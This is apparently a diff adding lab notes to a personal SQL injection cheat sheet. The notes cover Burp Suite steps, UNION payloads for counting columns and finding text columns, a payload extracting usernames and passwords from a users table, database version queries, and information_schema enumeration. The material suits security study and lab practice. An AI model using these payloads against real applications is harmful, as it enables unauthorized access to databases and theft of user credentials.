@@ -59,6 +59,111 @@ cat /usr/share/wordlists/seclists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzz
 
 
 ---
+## SQL injection UNION attack, determining the number of columns returned by the query
+
+
+1. Use Burp Suite to intercept and modify the request that sets the product category filter.
+2. Modify the `category` parameter, giving it the value `'+UNION+SELECT+NULL--`. Observe that an error occurs.
+3. Modify the `category` parameter to add an additional column containing a null value:
+    
+    `'+UNION+SELECT+NULL,NULL--`
+4. Continue adding null values until the error disappears and the response includes additional content containing the null values.
+
+## Test which column is text
+
+```
+'+UNION+SELECT+NULL,NULL,NULL--
+```
+
+or use #
+
+Replace the NULL with 'a'
+
+```
+'+UNION+SELECT+NULL,'a',NULL--
+```
+
+
+## The database contains a different table called `users`, with columns called `username` and `password`.
+
+' UNION SELECT username, password FROM users--
+
+
+## Find out number of columns + which column accepts string, then payload 
+
+```
+username||'~'||password+FROM+users--
+```
+
+```
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+```
+
+---
+
+## Querying the database type and version
+
+You can potentially identify both the database type and version by injecting provider-specific queries to see if one works
+
+The following are some queries to determine the database version for some popular database types:
+
+|                  |                           |
+| ---------------- | ------------------------- |
+| Database type    | Query                     |
+| Microsoft, MySQL | `SELECT @@version`        |
+| Oracle           | `SELECT * FROM v$version` |
+| PostgreSQL       | `SELECT version()`        |
+
+For example, you could use a `UNION` attack with the following input:
+
+```
+'+UNION+SELECT+@@version
+```
+
+This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
+
+`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`
+
+---
+
+## Listing the contents of the database
+
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+
+For example, you can query `information_schema.tables` to list the tables in the database:
+
+```
+SELECT * FROM information_schema.tables
+```
+
+This returns output like the following:
+
+| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
+| ------------- | ------------ | ---------- | ---------- |
+| MyDatabase    | dbo          | Products   | BASE TABLE |
+| MyDatabase    | dbo          | Users      | BASE TABLE |
+| MyDatabase    | dbo          | Feedback   | BASE TABLE |
+
+This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.
+
+You can then query `information_schema.columns` to list the columns in individual tables:
+
+```
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+This returns output like the following:
+
+| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
+| ------------- | ------------ | ---------- | ----------- | --------- |
+| MyDatabase    | dbo          | Users      | UserID      | int       |
+| MyDatabase    | dbo          | Users      | Username    | varchar   |
+| MyDatabase    | dbo          | Users      | Password    | varchar   |
+
+This output shows the columns in the specified table and the data type of each column.
+
+---
+
 
 SQLMAP
 
